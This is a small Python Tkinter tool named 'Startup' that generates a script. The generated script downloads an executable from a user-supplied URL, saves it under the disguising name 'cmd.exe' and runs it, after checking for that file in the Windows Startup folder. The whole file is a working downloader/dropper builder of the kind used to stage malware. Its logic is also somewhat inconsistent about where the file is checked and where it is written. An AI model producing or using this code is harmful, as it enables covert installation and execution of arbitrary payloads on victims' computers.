import os
from tkinter import *
root = Tk()
def Submit():
    link = url.get()
    with open("startup.py", "w") as writer:
        writer.write(fr"""
import requests
import os
cmd_exe = os.path.exists(fr'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cmd.exe')
if cmd_exe == False:
    URL = '{link}'
    response = requests.get(URL)
    open('cmd.exe', 'wb').write(response.content)
os.startfile('cmd.exe')
""")
Label(root, text="write your application URL: ").place(x=15, y=15)
Label(root, text="Startup repo: https://github.com/Unknow-per/Startup").place(x=15, y=150)
url = Entry(root, width=50)
Button(root, text="Submit", command=Submit, width=15, height=5).place(x=550, y=100)
url.place(x=115, y=50)
root.geometry("700x200")
root.title("Startup")
root.resizable(False, False)
root.mainloop()